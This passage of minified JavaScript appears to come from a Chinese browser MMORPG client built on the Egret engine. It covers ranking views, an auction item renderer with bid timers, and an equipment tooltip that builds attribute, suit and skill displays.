this.headGrp.visible=!1,this.xwyd.visible=!0,this.headGrp.visible=!1,this.fristName.text="",n.range[0]==n.range[1]?this.paihang.text=gettext("第{0}名",n.range[0]):this.itemIndex<3?this.paihang.text=gettext("第{0}-{1}名",n.range[0],n.range[1]):this.paihang.text=gettext("第{0}-{1}名",this.itemIndex+1,n.range[1])}else this.rangNeirongBg.source="cbNeirong2",this.fristName.text="",n.range[0]==n.range[1]?this.paihang.text=gettext("第{0}名",n.range[0]):this.paihang.text=gettext("第{0}-{1}名",this.itemIndex+1,n.range[1])}},e.prototype.getScoreDescByType=function(t,e){var i="";switch(t){case 3:var o=e;if(o>=110){var s=o%110;i+=gettext("{0}转{1}级",Math.floor(s/11),s%11)}else i+=gettext("{0}转{1}级",Math.floor(o/11),o%11);break;case 6:var r=a.GlobalConfig.JingMaiStageConfig[e];r&&(i+=gettext("{0}阶·{1}",n.StringUtils.NumberTurnChinese(r.level),r.name));break;default:i+=e}return i},e.prototype.getRankPlayerInfo=function(t,e){Math.min(t.range[0],t.range[1]);if(e&&e.openServerRank&&e.openServerRank.rankList&&e.openServerRank.rankList.length>0)for(var i=0,n=e.openServerRank.rankList.length;n>i;i++){var o=e.openServerRank.rankList[i];if(o&&o.rank==this.itemIndex+1)return o}return null},e}(o.BaseItemRender);e.OSATarget64Item2=u,window.OSATarget64Item2=u,__reflect(u.prototype,"OSATarget64Item2",[]),window.OSATarget64Item2=u},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.OpenServerRankView=void 0;var n=i(42),o=i(1),s=i(0),a=i(13),r=i(9),l=i(585),h=function(t){function e(){var e=t.call(this)||this;return e._sn_="KaiFuChongBangRankSkin",e}return __extends(e,t),e.prototype.skinComplete=function(){this.list0.itemRenderer=l.OpenServerRankItem,this.list0.dataProvider=this._rankArr=new eui.ArrayCollection},e.prototype.addDisplay=function(){for(var t=[],e=0;e<arguments.length;e++)t[e]=arguments[e];this._actId=t[0];var i=s.GlobalConfig.ActivityType64Config[this._actId][1];this._cfg=i,this.imgTitle.source=i.RangeShowTitle,this.observe(r.Activity.ins().postOpenServerRankInfoChange,this.flusInfo),r.Activity.ins().reqOpenServerRankInfo(this._actId),this.flusInfo()},e.prototype.flusInfo=function(){var t=r.Activity.ins().getActivityDataById(this._actId);if(t){var e=t.openServerRank.myRank;this.myRank.text=gettext("我的排名:{0}",-1==e?gettext("未上榜"):t.openServerRank.myRank),this.myNum.text=this.getScoreDescByType(this._cfg.rankingListType,t.openServerRank.curScore);for(var i=[],n=0;n<t.openServerRank.rankList.length;n++){var o=t.openServerRank.rankList[n];i.push({info:o,cfg:this._cfg})}this._rankArr.source=i}},e.prototype.getScoreDescByType=function(t,e){var i="";switch(t){case 3:var o=e;if(o>=110){var r=o%110;i+=gettext("{0}转{1}级",Math.floor(r/11),r%11)}else i+=gettext("{0}转{1}级",Math.floor(o/11),o%11);break;case 6:var l=a.SubRoles.ins().getSubRoleByIndex(0).jingMaiData,h=s.GlobalConfig.JingMaiStageConfig[l.stage];h&&(i+=gettext("{0}阶·{1}",n.StringUtils.NumberToChinese(h.level),h.name));break;default:i+=e}return i},e.prototype.removeDisplay=function(){},e}(o.BaseView);e.OpenServerRankView=h,window.OpenServerRankView=h,__reflect(h.prototype,"OpenServerRankView",[]),window.OpenServerRankView=h},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.OpenServerRankItem=void 0;var n=i(42),o=i(3),s=i(0),a=function(t){function e(){var e=t.call(this)||this;return e._sn_="KaiFuChongBangRankItem",e}return __extends(e,t),e.prototype.skinComplete=function(){},e.prototype.dataChanged=function(){this._info=this.data.info,this._cfg=this.data.cfg,this.data&&this.skin&&(this._info.rank<=3?(this.rankImg.source="paihang"+this._info.rank,this.rank.visible=!1):(this.rankImg.visible=!1,this.rank.visible=!0,this.rank.text=gettext("第{0}名",this._info.rank)),this.nameLabel.text=this._info.playerName,this.level.text=this.getScoreDescByType(this._cfg.rankingListType,this._info.score))},e.prototype.getScoreDescByType=function(t,e){var i="";switch(t){case 3:var o=e;if(o>=110){var a=o%110;i+=gettext("{0}转{1}级",Math.floor(a/11),a%11)}else i+=gettext("{0}转{1}级",Math.floor(o/11),o%11);break;case 6:var r=s.GlobalConfig.JingMaiStageConfig[e];r&&(i+=gettext("{0}阶·{1}",n.StringUtils.NumberTurnChinese(r.level),r.name));break;default:i+=e}return i},e}(o.BaseItemRender);e.OpenServerRankItem=a,window.OpenServerRankItem=a,__reflect(a.prototype,"OpenServerRankItem",[]),window.OpenServerRankItem=a},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.OpSelectItemRen=void 0;var n=i(3),o=function(t){function e(){var e=t.call(this)||this;return e._sn_="TreasureChuanshiItem",e.touchChildren=!0,e.touchEnabled=!0,e}return __extends(e,t),e.prototype.dataChanged=function(){this.gift.data=this.data,this.select.visible=this.select2.visible=!1},e.prototype.checkSelcted=function(t){this.select.visible=this.select2.visible=this.itemIndex==t},e}(n.BaseItemRender);e.OpSelectItemRen=o,window.OpSelectItemRen=o,__reflect(o.prototype,"OpSelectItemRen",[]),window.OpSelectItemRen=o},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.OSATarget72Item=void 0;var n=i(3),o=function(t){function e(){return null!==t&&t.apply(this,arguments)||this}return __extends(e,t),e.prototype.skinComplete=function(){},e.prototype.dataChanged=function(){this.data&&(this.num.text=this.data.val,this.count.text=this.data.amount)},e}(n.BaseItemRender);e.OSATarget72Item=o,window.OSATarget72Item=o,__reflect(o.prototype,"OSATarget72Item",[]),window.OSATarget72Item=o},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.OSATarget9ItemRender6=void 0;var n=i(18),o=i(3),s=function(t){function e(){var e=t.call(this)||this;return e.skinName="sevenDayItem",e.touchEnabled=!0,e.touchChildren=!1,e}return __extends(e,t),e.prototype.dataChanged=function(){if(this.data){var t=this.data[0],e=this.data[1],i=this.data[2];this.ItemIcon.data=t,this.eScore.text=Math.min(e.count,t.times)+"",this.eScore.textColor=e.count>=t.times?n.ColorUtil.GREEN:n.ColorUtil.RED,this.eLab.text="/"+t.times;var o=e.getStateByIndex(i);this.touchEnabled=this.eGetImg.visible=this.Rp.visible=!1,o?this.eGetImg.visible=!0:this.touchEnabled=this.Rp.visible=e.count>=t.times,this.touchChildren=!this.touchEnabled}},e.prototype.getIndex=function(){return this.data[2]||0},e}(o.BaseItemRender);e.OSATarget9ItemRender6=s,window.OSATarget9ItemRender6=s,__reflect(s.prototype,"OSATarget9ItemRender6",[]),window.OSATarget9ItemRender6=s},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.AuctionItemRender=void 0;var n=i(3),o=i(0),s=i(27),a=i(8),r=i(7),l=i(130),h=i(5),u=i(2),p=i(4),d=i(244),c=function(t){function e(){var e=null!==t&&t.apply(this,arguments)||this;return e.STATE_SHOW=0,e.STATE_AUCTION=1,e.STATE_END=2,e.state=0,e.leftTime=0,e}return __extends(e,t),e.prototype.dataChanged=function(){var t=this.data;if(t){var e=o.GlobalConfig.AuctionItem[t.aID];e&&(this.item.data=e.item,this.price=e.buy,this.price2=e.bid+Math.floor(e.bid*t.auctionTimes*o.GlobalConfig.AuctionConfig.priceIncrease/1e4),this.btn1.visible=e.buy>0,this.zb0.text=this.price+"",this.jingjia.text=this.price2+"",this.labelMy.source=d.AuctionWin.Page_Type?"paimai_quanfu":"paimai_gonghui",this.zb1.text=e.bid+Math.floor(e.bid*(t.auctionTimes>0?t.auctionTimes-1:0)*o.GlobalConfig.AuctionConfig.priceIncrease/1e4)+"",this.hasEventListener(egret.TouchEvent.REMOVED_FROM_STAGE)||this.addEventListener(egret.TouchEvent.REMOVED_FROM_STAGE,this.onRemove,this),this.hasEventListener(egret.TouchEvent.TOUCH_TAP)||this.addEventListener(egret.TouchEvent.TOUCH_TAP,this.onTouch,this),this.checkTime(),this.openedWard&&this.showWarn())}},e.prototype.showWarn=function(){s.WarnWin.show(gettext("是否花费|C:{0}&T:{1}|贡献",2149168,this.isYiKouJia?this.price:this.price2,this.isYiKouJia?gettext("立即拍下商品"):gettext("参与竞拍")),this.onAuction.bind(this),this,this.onAuction2.bind(this),this)},e.prototype.checkTime=function(){Timer.stopAll(this);var t=this.data,e=a.DateUtils.formatMiniDateTime(t.endTime),i=r.GameServerCC.serverTime,n=a.DateUtils.formatMiniDateTime(t.putAwayTime);this.leftTime=0,this.showTime.textColor=16711680,i>=e?(this.state=this.STATE_END,this.showTime.text="00:00:00",l.Auction.ins().deleteVo(t),l.Auction.ins().postUpdate()):Math.floor((i-n)/1e3)<(t.type?o.GlobalConfig.AuctionConfig.globalShowTime:o.GlobalConfig.AuctionConfig.guildShowTime)?(this.state=this.STATE_SHOW,this.showTime.textColor=16767295,this.leftTime=(t.type?o.GlobalConfig.AuctionConfig.globalShowTime:o.GlobalConfig.AuctionConfig.guildShowTime)-Math.floor((i-n)/1e3)):(this.state=this.STATE_AUCTION,this.showTime.textColor=65280,this.leftTime=Math.floor((e-i)/1e3)),this.leftTime&&(this.repeat(),Timer.start(1e3,0,this.repeat,this)),this.jingjiazhong.visible=t.auctionTimes>0,this.jingjiazhong.textFlow=h.TextFlowMaker.generateTextFlow("|C:"+(t.myAuPrice?16767295:2149168)+"&T:"+(t.myAuPrice?gettext("我的竞价"):gettext("竞价中")))},e.prototype.repeat=function(){return this.showTime.text=a.DateUtils.getFormatBySecond(this.leftTime,a.DateUtils.TIME_FORMAT_12)+(this.state==this.STATE_SHOW?gettext("后开始"):gettext("后结束")),this.state==this.STATE_AUCTION&&this.leftTime<=o.GlobalConfig.AuctionConfig.rushTime&&16711680!=this.showTime.textColor&&(this.showTime.textColor=16711680),this.leftTime<=0?void this.checkTime():void this.leftTime--},e.prototype.onRemove=function(){this.removeEventListener(egret.TouchEvent.REMOVED_FROM_STAGE,this.onRemove,this),this.removeEventListener(egret.TouchEvent.TOUCH_TAP,this.onTouch,this),Timer.stopAll(this),this.openedWard=!1,l.Auction.ins().sendGetList(d.AuctionWin.Page_Type)},e.prototype.onTouch=function(t){switch(t.target){case this.yikoujia:case this.yikoujia0:if(this.state==this.STATE_END)return void u.TipsCT.ins().showTips(gettext("物品拍卖结束"));if(this.state==this.STATE_SHOW)return void u.TipsCT.ins().showTips(gettext("物品展示时间"));this.openedWard=!0,this.isYiKouJia=t.target==this.yikoujia,this.showWarn()}},e.prototype.onAuction=function(){if(this.openedWard=!1,p.ActorCC.guildNum<(this.isYiKouJia?this.price:this.price2))return void this.noMoney();var t=this.data;this.isYiKouJia?l.Auction.ins().sendBuy(t.id,t.type):l.Auction.ins().sendAUction(t.id,t.type,t.auctionTimes+1)},e.prototype.noMoney=function(){u.TipsCT.ins().showTips(gettext("|C:0xf3311e&T:贡献不足|"))},e.prototype.onAuction2=function(){this.openedWard=!1},__decorate([delayCall(150)],e.prototype,"noMoney",null),e}(n.BaseItemRender);e.AuctionItemRender=c,window.AuctionItemRender=c,__reflect(c.prototype,"AuctionItemRender",[]),window.AuctionItemRender=c},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.EquipDetailedItem=void 0;var n=i(1),o=i(38),s=i(39),a=i(0),r=i(4),l=i(13),h=i(6),u=i(2),p=i(52),d=i(10),c=i(26),f=i(18),g=i(16),m=i(48),v=i(5),y=i(22),C=i(40),T=i(34),b=i(24),w=i(31),I=i(65),_=i(62),S=i(1562),x=i(104),D=i(208),A=i(185),k=i(224),B=i(225),P=i(189),R=i(57),E=i(12),G=i(15),M=i(126),L=i(58),F=i(118),O=i(200),N=i(473),W=i(591),U=i(121),H=function(t){function e(){var e=null!==t&&t.apply(this,arguments)||this;return e._sn_="equiptipsitemskin",e.scrollMaxHeight=620,e._bottomY=0,e._equipPower=0,e._totalPower=0,e.curRole=0,e.index=0,e.type1=0,e.onBody=!1,e.onBag=!1,e.fromGuildW=!1,e.isInit=!1,e.allPow=0,e.isMasterEquip=!1,e}return __extends(e,t),e.prototype.skinComplete=function(){this.listGem.itemRenderer=S.EquipInlayGemItemItem,this.listGem.dataProvider=this.listGemArr=new eui.ArrayCollection,this.masterEntryList.itemRenderer=W.EquipTipsMasterEntryItem},e.prototype.setData=function(t){var i;this.$param=t,this.skin&&t&&!this.isInit&&(this.isInit=!0,this.type1=t[0],this.itemHandle=t[1],this.configID=t[2],this.data=t[3],this.roleModel=t[4],e._rankRole=t[4],t[5]>=0&&(this.curRole=t[5]),t[6]&&(this.index=t[6]),this.checkIsMasterEquip(),this.updateComeFrom(),void 0!=(null===(i=this.roleModel)||void 0===i?void 0:i.isMy)?(this.eBtnGroup.visible=this.roleModel.isMy,this.eWearImg.visible=this.roleModel.isMy&&this.onBody):this.eWearImg.visible=this.onBody,this.updateView(this.type1,this.itemHandle,this.configID,this.data),this.updateSupSuitGroup(),this.updateSuitGroup(),this.updateSoulGroup(),this.updateCastingGroup(),this.updateExtraGroup(),this.updateSkillGroup(),this.updateExtremeGroup(),this.updateSacrificeGroup(),this.updateDuanPoGroup(),this.updateMasterGroup(),this.eScroller.height>this.scrollMaxHeight&&(this.eScroller.height=this.scrollMaxHeight))},e.prototype.addDisplay=function(){this.addTouchEvent(this.edecomposeBtn,this.onDecomposeBtn),this.addTouchEvent(this.eSynthesisBtn,this.onComposeBtn),this.addTouchEvent(this.eWearBtn,this.onClickOWearBtn),this.addTouchEvent(this.elockBtn,this.onClickLockBtn),this.addTouchEvent(this.eMoveBtn,this.onClickMoveBtn),this.addTouchEvent(this.eClearBtn,this.onClickClearBtn),observe(this,this.updateItemLock,o.EquipCT.ins().postLock),this.setData(this.$param),this.updateWearBtn(),this.updateDecompose(),this.updateLock(),this.updateMove(),this.updateClear(),this.updateCompose(),this.updateGemGroup()},e.prototype.updateView=function(t,e,i,n){var s,u,f,g=n instanceof C.ItemData?n:void 0;if(this._totalPower=0,void 0!=e&&void 0==g){if(g=h.BagCT.ins().getBagGoodsByHandle(t,e),!g)for(var I=l.SubRoles.ins().subRolesLen,_=0;I>_;_++)for(var S=l.SubRoles.ins().getSubRoleByIndex(_),x=S.getEquipLen(),D=0;x>D;D++)if(S.getEquipByIndex(D).item.handle==e){g=S.getEquipByIndex(D).item;break}if(!g)for(var A=p.Shop.ins().shopData,I=A.getShopEquipDataLength(),k=null,_=0;I>_;_++)if(k=A.getShopEquipDataByIndex(_),null!=k&&e==k.item.handle){g=k.item;break}g||new Error("请检查handle是否传错！"),f=g.itemConfig,i=g.configID}else f=a.GlobalConfig.ItemConfig[i];if(this.nameLabel.text=f.name,this.isMasterEquip?this.nameLabel.text=f.name:this.nameLabel.text=this.getExtremeName(f)+f.name,this.data instanceof C.ItemData)var B=this.data.quality?this.data.quality:d.ItemUtil.getQuality2(a.GlobalConfig.ItemConfig[this.data.itemConfig.id])>=0?d.ItemUtil.getQuality2(a.GlobalConfig.ItemConfig[this.data.itemConfig.id]):0;else B=d.ItemUtil.getQuality2(a.GlobalConfig.ItemConfig[this.data.id])>0?d.ItemUtil.getQuality2(a.GlobalConfig.ItemConfig[this.data.id]):(null===(s=this.data)||void 0===s?void 0:s.quality)||(null===(u=this.data)||void 0===u?void 0:u.qx)||0||0;this.nameLabel.textColor=d.ItemUtil.getQualityColor(B),this.qualityLab.text=w.QUALITY_NAME[B],this.qualityLab.textColor=d.ItemUtil.getQualityColor(B);var P=d.ItemUtil.getSubType(f),R=d.ItemUtil.getJob(f);this.quali.source="tips_"+B,this.itemIcon.data=this.data,void 0!=B&&this.itemIcon.setImgBg2("quality"+B);var E=0;if(g instanceof C.ItemData||f){var G=16767413,M="",L="";f.zsLevel>0?(M=gettext("转生："),G=c.ZsCT.ins().stage<f.zsLevel?15937822:3532333,L=gettext("{0}转{1}级",f.zsLevel,f.level||1)):f.lhLevel>0?(M=gettext("轮回："),G=U.LhCT.ins().lv<f.lhLevel-o.EquipCT.ins().cutEquipLhLv(g)?15937822:3532333,L=a.GlobalConfig.SamsaraLevelConfig[f.lhLevel].lvName):(M=gettext("等级："),G=r.ActorCC.level<f.level-o.EquipCT.ins().cutEquiplv(g)?15937822:3532333,L=gettext("{0}级",f.level||1)),this.lv.textFlow=v.TextFlowMaker.generateTextFlow1(gettext("{0}|C:{1}&T:{2}|",M,G,L)),this.isMasterEquip?this.type.textFlow=v.TextFlowMaker.generateTextFlow1(gettext("部位：|C:0xFFD9B5&T:{0}|",d.ItemUtil.getMasterPosName(P))):this.type.textFlow=v.TextFlowMaker.generateTextFlow1(gettext("部位：|C:0xFFD9B5&T:{0}|",m.Role.getEquipNameByType(P))),this.career.textFlow=v.TextFlowMaker.generateTextFlow1(gettext("职业：|C:0xFFD9B5&T:{0}|",m.Role.getJobNameByJob(R))),this.jobGroup.visible=!0}var F=a.GlobalConfig.EquipConfig[i],O=[],N=[],W="",H=(null===g||void 0===g?void 0:g.getJPNum())||0,q=[];if((!g||!g.att)&&(null===F||void 0===F?void 0:F.fixedJpAttr))for(var j=b.CommonUtils.objectToArray(null===F||void 0===F?void 0:F.fixedJpAttr),_=0;_<j.length;_++)q.push({type:j[_][0],value:j[_][1]});for(var V in m.Role.translate)if(F&&!isNaN(F[V])){var Y=new y.AttributeData;Y.type=m.Role.getAttrTypeByName(V),Y.value=F[V],O.push(Y),N.push(Y)}var K=b.CommonUtils.objectToArray(g?g.att||[]:q||[]);K.sort(function(t,e){return t.type>e.type?1:-1});for(var _=0;_<K.length;_++)if(0!=K[_].type){for(var Q=!0,J=0;J<O.length;J++)O[J].type==K[_].type&&(Q=!1,N[J].value+=K[_].value,N[J].supValue=K[_].value);Q&&N.push({type:K[_].type,value:K[_].value,supValue:K[_].value})
}for(var Z="",X=0,_=0;_<N.length;_++){var z="",$=N[_].type,te=void 0;te=this.isMasterEquip?y.AttributeData.getAttrStrByTypeTotem($):y.AttributeData.getAttrStrByType($);var ee=16769719,ie=N[_].value;void 0==N[_].supValue||this.isMasterEquip||(ee=4063083,X+=N[_].supValue),this.isMasterEquip&&z?(z+="<a color="+ee+">"+te+" "+ie+Z,z+=X?"+("+X+")":"",z+=_==N.length-1?"":"\n",X=0):$==T.AttributeType.atAtkMin||$==T.AttributeType.atAtkMageMin||$==T.AttributeType.atAtkTaoistMin||$==T.AttributeType.atDef?(z+="<a color="+ee+">"+te+" "+ie+Z,z+=" -"):$==T.AttributeType.atAtkMax||$==T.AttributeType.atAtkMageMax||$==T.AttributeType.atAtkTaoistMax||$==T.AttributeType.atRes?(z+=te+" "+ie+Z,z+=X?"(+"+X+")":"",z+=_==N.length-1?"":"\n",X=0):(z+="<a color="+ee+">"+te+" "+ie+Z,z+=X?"+("+X+")":"",z+=_==N.length-1?"":"\n",X=0),W+=z,$!=T.AttributeType.atAtkMin&&$!=T.AttributeType.atAtkMageMin&&$!=T.AttributeType.atAtkTaoistMin&&$!=T.AttributeType.atDef&&(W+="</a>")}if(this.attr.textFlow=(new egret.HtmlTextParser).parse(W),H&&void 0!=g&&a.GlobalConfig.EquipConfig[g.configID]&&a.GlobalConfig.EquipConfig[g.configID].jpNum){this.JpGroup.visible=!0;var ne=a.GlobalConfig.EquipConfig[g.configID];this.jp.text=H+"("+g.getJPPer()+"%)";for(var oe=0,_=ne.jpNum.length-1;_>=0;_--)if(H>=ne.jpNum[_]){oe=_;break}this.jp.textFlow=v.TextFlowMaker.generateTextFlow1(gettext("极品：|C:{0}&T:{1}|",w.QUALITY_COLOR[oe],H+"("+g.getJPPer()+"%)"))}else this.JpGroup.visible=!1;for(g?this._equipPower=g.point:(this._equipPower=Math.floor(d.ItemUtil.getAttrPower(N)),F&&F.exPower&&(E=F.exPower)),this._totalPower+=this._equipPower+E,this._score=this._totalPower,this._bottomY=0;this.forgeGroup.numElements;)this.forgeGroup.removeChildAt(0);if(this.roleModel&&F&&(F.baseAttr1&&(this._equipPower+=d.ItemUtil.relatePower(F.baseAttr1,this.roleModel)),F.baseAttr2&&(this._equipPower+=d.ItemUtil.relatePower(F.baseAttr2,this.roleModel))),f.desc){var se=new eui.Label;se.size=22,se.width=380,se.wordWrap=!0,se.textColor=13746831,se.x=this.attr.x,se.y=this._bottomY+=10,se.textFlow=v.TextFlowMaker.generateTextFlow(f.desc),this.forgeGroup.addChild(se),this._bottomY+=se.textHeight}this.allPow=this._totalPower,this.powerLab.text=gettext("战力:{0}",this.allPow)},e.prototype.getScore=function(){return this._score},e.prototype.getPower=function(){return this.allPow},e.prototype.getType=function(){return this.type.text},e.prototype.haveEquip=function(t){var e=a.GlobalConfig.HotBloodAwakeConf.legendEquip;if(0==this.roleModel.equipsData[t].item.configID)return!1;if(0==t){for(var i=0;i<e.length/2;i++)if(this.roleModel.equipsData[0].item.configID==e[i])return this._totalPower=d.ItemUtil.calculateBagItemScore(this.roleModel.equipsData[0].item),!0}else for(var i=e.length/2;i<e.length;i++)if(this.roleModel.equipsData[2].item.configID==e[i])return this._totalPower=d.ItemUtil.calculateBagItemScore(this.roleModel.equipsData[2].item),!0;return!1},e.prototype.createLabel=function(t,e,i,n,o){var s=new eui.Label;return s.size=22,s.width=380,s.fontFamily="Arial",s.textColor=13746831,s.text=e,s.anchorOffsetX=0,s.anchorOffsetY=0,s.textAlign=n,s.textColor=i,t.addChild(s),s.y=this._bottomY+=9,this._bottomY=s.y+s.height,s.x+=o,s},e.prototype.getGodPowerFormItemId=function(t){var e=a.GlobalConfig.MasterEquipConf;for(var i in e)if(e[i].itemId==t)return e[i].godpower},e.prototype.updateSupSuitGroup=function(){var t,e=this.data.supExtAtt||[],i=this.data.supExtAttQuality||[],n="";this.data.id&&(t=a.GlobalConfig.EquipConfig[this.data.id]),n=t&&t.fixedAffixAttr?d.ItemUtil.getAttrsDataBy(t.id):y.AttributeData.getAttrShowStr(e,": ",i),this.supExtAttr.textFlow=(new egret.HtmlTextParser).parse(n),n||g.DisplayUtils.removeFromParent(this.eSupExtGroup)},e.prototype.updateSuitGroup=function(){var t,e=a.GlobalConfig.EquipConfig[this.configID],i=(null===e||void 0===e?void 0:e.suitId)||-1,n=a.GlobalConfig.EquipSuitAttrConfig[i];if(!e||!n)return void g.DisplayUtils.removeFromParent(this.eSuitGrp);var o="",s=this.roleModel||l.SubRoles.ins().getSubRoleByIndex(this.curRole),r=a.GlobalConfig.ItemConfig,h=0;for(var u in n.item){var p=n.item[u],c=r[p],m=d.ItemUtil.getSubType(c),C=s.equipsData[m],T=C.item.configID==p;T&&h++,""!=o&&(o+="\n"),o+="|C:"+(T?f.ColorUtil.GREEN:f.ColorUtil.GRAY)+"&T:"+c.name+"|"}var b="",w=h>0&&h==n.item.length;if(w)for(var u in n.attrs){var I=n.attrs[u];b+="\n"+y.AttributeData.getAttrStrByType(I[0])+": "+I[1]/100+"%"}else{var c=r[this.configID],m=d.ItemUtil.getSubType(c),_=s.equipsData[m],T=_.item.configID==this.configID,S=void 0;if(T&&(S=this.checkOtherSuitCfg(i)),S){o="",h=0;for(var u in S.item){var p=S.item[u],x=r[p],D=!0;D&&h++,""!=o&&(o+="\n"),o+="|C:"+(D?f.ColorUtil.GREEN:f.ColorUtil.GRAY)+"&T:"+x.name+"|"}b="",w=h>0&&h==S.item.length;for(var u in S.attrs){var I=S.attrs[u];b+="\n"+y.AttributeData.getAttrStrByType(I[0])+": "+I[1]/100+"%"}}else for(var u in n.attrs){var I=n.attrs[u];b+="\n"+y.AttributeData.getAttrStrByType(I[0])+": "+I[1]/100+"%"}}o+="|C:"+(w?f.ColorUtil.GREEN:f.ColorUtil.GRAY)+"&T:"+b+"|",this.eSuitAttr.textFlow=v.TextFlowMaker.generateTextFlow1(o),this.eSuitTitle.textFlow=v.TextFlowMaker.generateTextFlow1(this.eSuitTitle.text+" |C:"+(w?f.ColorUtil.GREEN:f.ColorUtil.GRAY)+"&T: ("+h+"/"+(null===(t=n.item)||void 0===t?void 0:t.length)+")|")},e.prototype.checkOtherSuitCfg=function(t){var e,i=Math.floor(t/100),n=this.roleModel||l.SubRoles.ins().getSubRoleByIndex(this.curRole),o=[],s=0,r=0;for(var h in a.GlobalConfig.EquipSuitAttrConfig){var u=a.GlobalConfig.EquipSuitAttrConfig[h];if(u&&Math.floor(u.id/100)==i&&u.id>=t){s=u.item.length;for(var p in u.item){var c=u.item[p],f=a.GlobalConfig.ItemConfig[c],g=d.ItemUtil.getSubType(f),m=n.equipsData[g];m.item.configID==c&&o.push(u.id)}}}if(o.length>=s)for(var v=0;v<o.length;v++){var y=o[v];(r>y||0==r)&&(r=y)}return r&&(e=a.GlobalConfig.EquipSuitAttrConfig[r]),e},e.prototype.updateCastingGroup=function(){var t,e=[],i=[],n=a.GlobalConfig.EquipConfig[this.configID];if((null===(t=null===n||void 0===n?void 0:n.castingAttr)||void 0===t?void 0:t.length)>0)for(var o in n.castingAttr){var s=new y.AttributeData(n.castingAttr[o].type,n.castingAttr[o].value);e.push(s),i.push(6)}var r=y.AttributeData.getAttrShowStr(e,": ",i);this.eCastingAttr.textFlow=(new egret.HtmlTextParser).parse(r),r||g.DisplayUtils.removeFromParent(this.eCastingGrp)},e.prototype.updateDuanPoGroup=function(){if(!this.data||!this.data.equipDuanPoPro||!this.data.equipDuanPoPro.skillId)return void g.DisplayUtils.removeFromParent(this.eForgeSoulGrp);this.eForgeSoulSkillAttr.textFlow=v.TextFlowMaker.generateTextFlow(o.EquipCT.ins().getCurSkillDesc(this.data));var t=[];if(this.data.equipDuanPoPro.proArr&&this.data.equipDuanPoPro.proArr.length>0)for(var e in this.data.equipDuanPoPro.proArr){var i=this.data.equipDuanPoPro.proArr[e],n=a.GlobalConfig.ForgeSoulReviseConfig[i];n&&t.push(n)}if(0==t.length)return void(this.eForgeSoulAttr.text=gettext("属性：未鉴定"));for(var s="",r=0,l=t.length;l>r;r++){var n=t[r],h=16711680;s+=0==r?"|C:"+h+"&T:"+L.LangUtils.formatStr(n.desc,[n.value]):"\n|C:"+h+"&T:"+L.LangUtils.formatStr(n.desc,[n.value])}this.eForgeSoulAttr.textFlow=v.TextFlowMaker.generateTextFlow(s)},e.prototype.updateSoulGroup=function(){for(var t,e,i,n=!1,o=this.data.extAtt||[],s=0;s<o.length;s++)if(o[s].value){n=!0;break}var r=a.GlobalConfig.EquipConfig[this.configID];if(!n||!r)return void g.DisplayUtils.removeFromParent(this.eSoulGrp);for(var h=this.roleModel||l.SubRoles.ins().getSubRoleByIndex(this.curRole),u=r.suitEquipId.length>1?r.suitEquipId[h.job-1]:r.suitEquipId[0],s=0;s<r.suitEquipId.length;s++)if(h.equipsData[_.EquipPos.WEAPON].item.configID==r.suitEquipId[s]){u=r.suitEquipId[s];break}for(var s=0;s<r.suitEquipId.length;s++)if(h.equipsData[_.EquipPos.CLOTHES].item.configID==r.suitEquipId[s]){u=r.suitEquipId[s];break}for(var p=!0,d=a.GlobalConfig.ItemConfig[u],c=a.GlobalConfig.ItemDescConfig[d.descIndex],m=c.posList||[c.subType],s=0;s<m.length;s++)if(h.equipsData[m[s]].item.configID!=u||h.equipsData[m[s]].item.extAttQuality[0]!=this.data.extAttQuality[0]){p=!1;break}var C="|C:16711680&T:"+gettext("激活条件")+"："+gettext("穿戴")+" "+w.SOUL_NAME[this.data.extAttQuality[0]||0]+"·"+(null===d||void 0===d?void 0:d.name)+"|",T=p?"|C:"+f.ColorUtil.GREEN+"&T:(1/1)\n|":"|C:"+f.ColorUtil.GRAY+"&T:(0/1)\n|";T+=p?"|C:16711680&T:":"|C:"+f.ColorUtil.GRAY+"&T:";var b=[];for(var s in o)o[s].value&&b.push(o[s]);for(var s=0;s<b.length;s++){var I=b[s].type;y.AttributeData.getAttrStrByType(I);var S=a.GlobalConfig.AttrConfig[I],x=S.divisor?b[s].value/S.divisor:b[s].value;T+="|C:16711680&T:"+y.AttributeData.getAttrStrByType(I)+": "+x+(S.suffix||"")+(s==b.length-1?"":"\n")}T+="|",(null===(t=this.data)||void 0===t?void 0:t.isPreview)&&(null===(e=this.data)||void 0===e?void 0:e.star)<3&&(T+="\n|C:16711680&T:"+gettext("将增加并获得1条随机属性")+"|"),this.eSoulAttr.textFlow=v.TextFlowMaker.generateTextFlow1(C+T),this.nameLabel.text=w.SOUL_NAME[this.data.extAttQuality[0]||0]+"·"+(null===(i=this.data.itemConfig)||void 0===i?void 0:i.name)},e.prototype.updateExtraGroup=function(){var t=a.GlobalConfig.EquipConfig[this.configID],e=a.GlobalConfig.ItemConfig[this.configID],i=a.GlobalConfig.ItemDescConfig[e.descIndex];if(!t||!t.baseAttr1&&!t.baseAttr2||i.subType<=_.EquipPos.ReviveRing&&i.subType>=_.EquipPos.PowerRing)return void g.DisplayUtils.removeFromParent(this.eExtraGrp);var n="";t.baseAttr1&&(n+=y.AttributeData.getAttrShowStr([t.baseAttr1],": ")),n+="\n",t.baseAttr2&&(n+=y.AttributeData.getAttrShowStr([t.baseAttr2],": ")),this.eExtraAttr.textFlow=(new egret.HtmlTextParser).parse(n)},e.prototype.updateSkillGroup=function(){var t=a.GlobalConfig.EquipConfig[this.configID];if(!t||!t.equipSkill)return void g.DisplayUtils.removeFromParent(this.eSkillGrp);this.skillIcon.source=100*Math.floor(t.equipSkill/100)+"_png";var e=t.equipSkill%100,i=a.GlobalConfig.SkillsConfig[t.equipSkill],n=a.GlobalConfig.SkillsDescConfig[i.desc],o=n.name+"lv."+e+"\n"+I.SkillUtil.getDesc(i);this.eSkillDesc.textFlow=v.TextFlowMaker.generateTextFlow1(o)},e.prototype.getExtremeName=function(t){var e="",i=M.ExtremeEquipCC.getZhiZunLvByRoleID(this.roleModel,this.index);return 